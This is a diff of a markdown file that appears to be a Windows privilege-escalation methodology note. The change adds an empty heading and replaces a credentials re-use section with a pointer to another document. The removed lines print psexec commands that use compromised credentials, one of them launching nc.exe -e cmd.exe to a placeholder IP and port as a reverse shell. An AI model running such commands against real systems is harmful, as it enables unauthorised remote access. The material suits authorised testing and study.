@@ -947,6 +947,7 @@ Windows Subsystem for Linux
 Introduced in Windows 10
 Lets you execute Linux binaries natively on Windows
 
+###### 
 ###### File system
 
 ###### Backdoor
@@ -957,14 +958,8 @@ Lets you execute Linux binaries natively on Windows
 
 ### Credentials re-use
 
-To use another user credentials, `psexec` can be used to start a local or
-reverse shell:
-
-```
-# Use the -s option if the user provided is member of the administrators group
-psexec.exe -s -i -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD>
-psexec.exe -s -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD> <FULLPATH/nc.exe> -e cmd.exe <IP> <PORT>
-```
+Refer to the `Active Directory - Credentials theft shuffle` for methodology and
+tools to re use compromised credentials on the target.
 
 ### Administrator to SYSTEM
 
